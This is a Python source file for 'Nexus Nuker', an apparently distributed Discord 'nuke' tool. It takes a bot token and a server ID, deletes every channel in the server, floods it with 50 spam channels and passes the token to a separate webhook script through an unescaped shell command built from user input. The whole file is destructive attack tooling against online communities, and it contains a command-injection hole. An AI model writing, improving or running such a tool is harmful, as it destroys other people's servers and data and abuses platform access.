from Helper import *
from Helper.Common.utils import *

def clear():
    os.system("cls" if os.name == "nt" else "clear")

lc = (Fore.RESET + "[" + Fore.LIGHTMAGENTA_EX + ">" + Fore.RESET + "]")
Channel_created = 0
Channel_delted2 = 0

class Log:
    @staticmethod
    def err(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTRED_EX} ERROR {Fore.RESET}] {msg}')

    @staticmethod
    def succ(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX}+{Fore.RESET}] {msg}')

    @staticmethod
    def console(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX}-{Fore.RESET}] {msg}')

    @staticmethod
    def invalid(msg):
        print(f'{Style.BRIGHT}[{Fore.LIGHTMAGENTA_EX} INVALID {Fore.RESET}] {msg}')

option1 = '[' + Fore.LIGHTMAGENTA_EX + "1" + Fore.RESET + "]"

def set_window_title(title):
    try:
        console_handle = ctypes.windll.kernel32.GetConsoleWindow()

        ctypes.windll.kernel32.SetConsoleTitleW(title)
    except Exception as e:
        print(f'Error occurred while setting window title: {str(e)}')

def upodate_title():
    set_window_title(f"Nexus Nuker Channels Delted: {Channel_delted2} | Channels Created: {Channel_created} ")

clear()
set_window_title("Nexus Nuker discord.gg/nexus-tools")

async def delete_channel(session, channel_id):
    global Channel_delted2
    url = f'https://discord.com/api/v9/channels/{channel_id}'
    async with session.delete(url) as response:
        if response.status == 204 or response.status == 200:
            Channel_delted2 += 1
            upodate_title()
            os.system("cls")
            Log.succ(f'Deleted channel' + Fore.MAGENTA + f" {Channel_delted2}" + Fore.RESET)


async def delete_channels(session, guild_id, token):
    headers = {
        'Authorization': f'barrer {token}',
        'Content-Type': 'application/json'
    }
    deleted_count = 0
    while True:
        url = f'https://discord.com/api/v9/guilds/{guild_id}/channels'
        async with session.get(url) as response:
            if response.status == 200:
                channels = await response.json()
                if len(channels) == 0:
                    break
                deletion_tasks = []
                for channel in channels:
                    deletion_tasks.append(delete_channel(session, channel['id']))
                    deleted_count += 1
                await asyncio.gather(*deletion_tasks)
            else:
                print(f'Failed to fetch channels. Status code: {response.status}')
                break
    return deleted_count



async def create_channel(guild_id, token, name):
    headers = {
        'Authorization': f'barrer {token}',
        'Content-Type': 'application/json'
    }
    payload = {
        'name': name,
        'guild_id': guild_id
    }

    async with aiohttp.ClientSession() as session:
        global Channel_created, Channel_delted2
        async with session.post(f'https://discord.com/api/v10/guilds/{guild_id}/channels', headers=headers, json=payload) as response:
            if response.status == 201:
                data = await response.json()
                channel_id = data['id']
                Channel_created += 1
                os.system("cls")
                upodate_title()
                Log.succ(f'Deleted channel' + Fore.MAGENTA + f" {(Channel_delted2)}" + Fore.RESET)
                Log.succ(f"Channel created" + Fore.MAGENTA + f" {(Channel_created)}" + Fore.RESET )
                return channel_id


async def main(token):
    global Channel_created, Channel_delted2
    guild_id = input(lc + " Input Guild/Server id: ")
    name = input(lc + "Enter channel name: ")
    message = input(lc + "Enter Message To send: ")

    tasks = []
    for _ in range(50):
        tasks.append(create_channel(guild_id, token, name))

    async with aiohttp.ClientSession(headers={'Authorization': f'{token}'}) as session:
        deleted_count = await delete_channels(session, guild_id, token)
        created_count = Channel_created
        try:
            await asyncio.gather(*tasks)
        finally:
            os.system(f"python Helper/Plugs/DiscordNukerPlugs/funcs/webhook.py {token} {guild_id} {Channel_delted2} {Channel_created} {message}")


def Discord_nuker():
    clear()
    print(banner)
    print("                                                      " + Fore.RESET + option1 + "Nuke" )
    choice = input(lc + "Enter Choice: ")
    try:
        if choice == '1':
            token = input(lc + "Enter Bot Token: ")
            if not token:
                print(f"{Fore.RED}No token provided")
                input()
                exit()
            asyncio.run(main(token))
        else:
            print(Fore.RESET +"[" + Fore.RED + "-" + Fore.RESET + "]" + " Invalid choice")
            input(Fore.RESET +"[" + Fore.YELLOW + "-" + Fore.RESET + "]" + " Press any key to go back...")
            Discord_nuker()
    except ValueError:
        print(Fore.RESET +"[" + Fore.RED + "-" + Fore.RESET + "]" + " Invalid choice")
        input(Fore.RESET +"[" + Fore.YELLOW + "-" + Fore.RESET + "]" + " Press any key to go back...")
        Discord_nuker()

